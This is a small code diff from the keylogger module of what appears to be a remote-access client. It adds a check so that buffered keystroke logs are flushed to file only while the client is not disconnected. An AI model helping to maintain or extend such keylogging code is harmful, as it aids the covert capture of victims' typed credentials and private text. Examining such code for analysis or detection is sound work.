@@ -224,7 +224,7 @@ namespace xClient.Core.Keylogger
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0)
+            if (_logFileBuffer.Length > 0 && !SystemCore.Disconnect)
                 WriteFile();
         }
 
